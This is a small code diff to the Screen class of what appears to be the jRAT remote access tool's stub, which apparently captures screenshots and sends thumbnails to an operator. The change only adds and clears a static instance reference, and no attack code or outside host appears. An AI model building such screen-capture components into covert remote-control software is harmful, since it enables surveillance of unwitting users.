@@ -19,6 +19,7 @@ import pro.jrat.stub.utils.ImageUtils;
 public class Screen implements Runnable {
 
 	public static boolean running;
+	public static Screen instance;
 
 	private boolean repeat;
 	private int size;
@@ -26,6 +27,7 @@ public class Screen implements Runnable {
 	private int monitor;
 
 	public Screen(boolean repeat, int size, int quality, int monitor) {
+		Screen.instance = this;
 		this.repeat = repeat;
 		this.size = size;
 		this.quality = quality;
@@ -89,6 +91,7 @@ public class Screen implements Runnable {
 		}
 		
 		running = false;
+		instance = null;
 	}
 
 	public static void sendThumbnail() {
